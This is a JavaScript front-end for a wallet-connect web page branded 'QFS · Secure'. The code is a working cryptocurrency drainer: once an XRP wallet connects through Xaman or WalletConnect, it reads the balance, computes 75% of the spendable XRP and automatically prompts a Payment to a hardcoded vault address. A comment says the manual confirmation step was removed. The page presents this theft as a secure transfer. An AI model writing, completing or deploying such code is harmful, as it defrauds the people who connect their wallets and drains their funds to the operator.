// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
const xumm = new XummPkce(XUMM_API_KEY);

let wcClient = null;
let wcModal  = null;

/**
 * FIX: Listen for the redirect "Success" event.
 * This ensures that when Xaman sends the user back to the site, 
 * the app immediately realizes it is connected and prompts for approval.
 */
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me && state.me.account) {
    handlePostConnect("xaman", state.me.account);
  }
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

/**
 * FIX: Hides the "Connect Wallet" button once a session is active.
 */
function hideConnectButton() {
  const btn = document.querySelector('button[data-bs-target="#walletSelectionModal"]');
  if (btn) btn.style.display = "none";
}

// ==============================
// MAIN ENTRY
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");

    let address;

    if (type === "xaman") {
      const session = await xumm.authorize();
      address = session?.me?.account;
    } 
    else if (type === "walletconnect") {
      await initWalletConnect();
      setStatus("Scan QR Code");
      address = await connectViaWalletConnect();
    }

    if (!address) throw new Error("No address");

    await handlePostConnect(type, address);

  } catch (err) {
    console.error(err);
    // Only show failed if we aren't actually authorized
    const state = await xumm.state();
    if (!state?.me?.account) {
        setStatus("Failed");
    }
  }
}

/**
 * AUTOMATED FLOW
 * This function triggers the approval prompt automatically.
 */
async function handlePostConnect(type, address) {
    try {
        // 1. Update UI
        hideConnectButton();
        setStatus(`Connected: ${shortAddr(address)}`);

        // 2. Fetch Data
        setStatus("Calculating...");
        const data = await getXrpAccountData(address);

        // 3. AUTO-PROMPT (Removed manual confirm box)
        setStatus("Awaiting Approval...");
        await signAndSubmit(type, address, data.sendDrops);

        setStatus("Transaction Sent ✔");
    } catch (err) {
        console.error("Auto-flow error:", err);
        setStatus(`Connected: ${shortAddr(address)}`);
    }
}

// ==============================
// WALLETCONNECT HELPERS
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS · Secure",
      description: "Secure XRP Transfer",
      url: window.location.origin,
      icons: ["https://xrpl.org/assets/img/logo.svg"]
    }
  });
  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"],
        events: ["accountsChanged"]
      }
    }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}

// ==============================
// FETCH XRP DATA
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  const info = await client.request({
    command: "account_info",
    account: address,
    ledger_index: "validated"
  });
  await client.disconnect();

  const bal = BigInt(info.result.account_data.Balance);
  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
  const reserve = 1_000_000n + ownerCount * 200_000n;
  const spendable = bal - reserve;
  const send = (spendable * 75n) / 100n; // Transfers 75%

  return { sendDrops: send.toString() };
}

// ==============================
// SIGN & SUBMIT
// ==============================
async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops
  };

  if (type === "xaman") {
    // This triggers the signing popup in Xaman automatically
    await xumm.payload.create(tx);
  }
  else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }
}